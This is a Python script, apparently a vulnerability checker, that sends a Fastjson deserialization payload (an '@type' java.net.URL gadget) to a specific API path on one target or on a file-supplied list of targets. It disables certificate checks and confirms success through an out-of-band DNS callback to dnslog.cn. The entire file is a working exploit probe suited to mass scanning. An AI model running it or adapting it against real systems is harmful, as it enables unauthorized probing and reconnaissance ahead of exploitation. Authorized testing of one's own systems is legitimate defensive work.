#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def get_dnslog():
    response = requests.get('http://www.dnslog.cn/getdomain.php')
    return response.text.strip()

def check_dnslog(dnslog):
    check_url = f'http://www.dnslog.cn/getrecords.php?t={dnslog}'
    response = requests.get(check_url)
    return dnslog in response.text

def send_request(target, dnslog_url):
    data = {
        "a": {
            "@type": "com.alibaba.fastjson.JSONObject",
            "@type": "java.net.URL", 
            "val": dnslog_url
        }
    }
    headers = {
        "Content-Type": "application/json;charset=utf-8",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
    }
    path = "/evo-runs/v1.0/auths/sysusers/random"
    try:
        response = requests.post(target + path, json=data, headers=headers, verify=False)
        if check_dnslog(dnslog_url):
            print(f"{RED}{target} 可能存在漏洞{RESET}")
        else:
            print(f"{target} 漏洞不存在")
    except requests.RequestException as e:
        print(f"请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    dnslog_url = get_dnslog()
    dnslog_url = "http://" + dnslog_url

    if args.url:
        send_request(args.url, dnslog_url)
    elif args.file:
        with open(args.file, 'r') as f:
            targets = f.read().splitlines()
            for target in targets:
                if not target.startswith("http://") and not target.startswith("https://"):
                    target = "http://" + target
                send_request(target, dnslog_url)

if __name__ == '__main__':
    main()